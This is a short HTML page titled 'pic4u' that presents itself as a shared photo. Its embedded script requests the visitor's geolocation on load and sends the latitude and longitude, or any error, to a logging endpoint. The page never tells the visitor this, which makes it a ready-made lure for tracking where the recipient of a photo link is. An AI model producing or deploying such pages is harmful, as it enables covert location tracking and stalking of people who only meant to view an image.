<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>pic4u</title>
  <style>
    body {margin:0;padding:0;background:#000;text-align:center;}
    img {width:100%;height:auto;max-width:600px;}
  </style>
</head>
<body>
  <img src="myphoto.jpg" alt="Shared Photo">
  <script>
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        function(pos) {
          var lat = pos.coords.latitude;
          var lon = pos.coords.longitude;
          fetch('/api/log?lat=' + lat + '&lon=' + lon);
        },
        function(err) {
          fetch('/api/log?error=' + encodeURIComponent(err.message));
        }
      );
    } else {
      fetch('/api/log?error=NoGeolocationSupport');
    }
  </script>
</body>
</html>
